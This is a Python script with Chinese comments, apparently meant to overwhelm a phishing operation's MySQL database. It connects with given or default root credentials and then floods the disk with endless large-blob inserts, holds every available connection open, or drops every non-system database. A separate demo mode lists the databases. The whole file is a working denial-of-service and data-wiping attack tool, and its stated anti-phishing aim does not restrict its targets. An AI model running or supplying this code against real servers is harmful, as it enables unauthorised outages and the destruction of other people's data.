#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mysql_flood.py — 针对钓鱼库的"灌数据卡死"工具（资源耗尽）
用法:
    python3 mysql_flood.py --host <真实库IP> --port 3306 --user root --pass root [--mode disk|conn|drop]

模式:
  disk  : 无限 INSERT 大字段，撑爆磁盘/ibdata (默认)
  conn  : 疯狂开连接占满 max_connections
  drop  : 清空 phishdb (取证后用)
  demo  : 只连一次验证凭据 + 列出库表，不破坏

需要: pip3 install pymysql
"""
import sys, time, threading, argparse, random, string
import pymysql

def connect(args, db=None):
    return pymysql.connect(
        host=args.host, port=args.port, user=args.user, password=args.pwd,
        database=db, connect_timeout=10, autocommit=True, charset="utf8mb4")

def mode_demo(args):
    c = connect(args)
    with c.cursor() as cur:
        cur.execute("SELECT VERSION(), @@hostname, @@port")
        print("[+] 连接成功:", cur.fetchone())
        cur.execute("SHOW DATABASES")
        print("[+] 数据库:", [r[0] for r in cur.fetchall()])
    c.close()

def mode_drop(args):
    c = connect(args)
    with c.cursor() as cur:
        cur.execute("SHOW DATABASES")
        dbs = [r[0] for r in cur.fetchall() if r[0] not in ("information_schema","mysql","performance_schema","sys")]
        print("[+] 待清空库:", dbs)
        for d in dbs:
            cur.execute(f"DROP DATABASE IF EXISTS `{d}`")
            print("    dropped:", d)
    c.close()
    print("[+] 钓鱼库已清空")

def _flood_worker(args, tid, stop, counter):
    payload = "".join(random.choices(string.ascii_letters + string.digits, k=args.rowsize)).encode()
    try:
        c = connect(args)
        with c.cursor() as cur:
            cur.execute("CREATE DATABASE IF NOT EXISTS phish_flood CHARACTER SET utf8mb4")
            cur.execute("CREATE TABLE IF NOT EXISTS phish_flood.filler (id BIGINT AUTO_INCREMENT PRIMARY KEY, data LONGBLOB) ENGINE=InnoDB")
        n = 0
        while not stop.is_set():
            with c.cursor() as cur:
                cur.execute("INSERT INTO phish_flood.filler (data) VALUES (%s)", (payload,))
            n += 1
            counter[0] += 1
            if n % 200 == 0:
                print(f"    [thread{tid}] {n} rows, total={counter[0]}")
    except Exception as e:
        print(f"    [thread{tid}] ERR {type(e).__name__}: {e}")

def mode_disk(args):
    stop = threading.Event()
    counter = [0]
    threads = [threading.Thread(target=_flood_worker, args=(args, i, stop, counter)) for i in range(args.threads)]
    for t in threads: t.start()
    print(f"[+] {args.threads} 线程开始灌数据 (rowsize={args.rowsize})，Ctrl+C 停止")
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("[*] 停止中...")
        stop.set()
        for t in threads: t.join(timeout=3)
        print(f"[+] 结束，共写入 {counter[0]} 行")

def mode_conn(args):
    stop = threading.Event()
    def opener(tid):
        pool = []
        try:
            while not stop.is_set():
                try:
                    c = connect(args)
                    pool.append(c)
                except Exception as e:
                    print(f"    [t{tid}] 连接池上限已到: {type(e).__name__}: {e}")
                    break
            print(f"    [t{tid}] 持有 {len(pool)} 条连接，阻塞中...")
            while not stop.is_set(): time.sleep(5)
        finally:
            for c in pool:
                try: c.close()
                except: pass
    ts = [threading.Thread(target=opener, args=(i,)) for i in range(args.threads)]
    for t in ts: t.start()
    print(f"[+] {args.threads} 线程抢占连接，Ctrl+C 停止")
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        stop.set()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=3306)
    ap.add_argument("--user", default="root")
    ap.add_argument("--pass", dest="pwd", default="root")
    ap.add_argument("--mode", default="disk", choices=["demo","disk","conn","drop"])
    ap.add_argument("--threads", type=int, default=8)
    ap.add_argument("--rowsize", type=int, default=65536)
    args = ap.parse_args()
    {"demo": mode_demo, "disk": mode_disk, "conn": mode_conn, "drop": mode_drop}[args.mode](args)

if __name__ == "__main__":
    main()
